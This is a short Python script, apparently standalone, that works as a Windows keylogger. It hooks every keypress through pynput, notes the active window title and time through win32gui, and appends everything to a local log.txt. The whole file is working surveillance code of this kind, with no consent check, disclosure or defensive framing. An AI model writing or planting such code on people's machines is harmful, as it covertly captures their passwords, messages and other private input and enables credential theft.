from win32gui import GetWindowText, GetForegroundWindow
from pynput import keyboard
import datetime

LAST_WINDOW = None

def on_presskey(key):
    global LAST_WINDOW
    with open("log.txt", "a") as file:
        window = GetWindowText(GetForegroundWindow())
        if window != LAST_WINDOW:
            LAST_WINDOW = window
            file.write("\n =-=-= {} - {}\n".format(window, datetime.datetime.now()))
        try:
            if key.vk >= 96 and key.vk <= 105:
                key = key.vk - 96
        except:
            pass
        key = str(key).replace("'", "")
        if len(key) > 1:
            key = " [{}] " .format(key)
        file.write(key)

with keyboard.Listener(on_press=on_presskey) as listener:
    listener.join()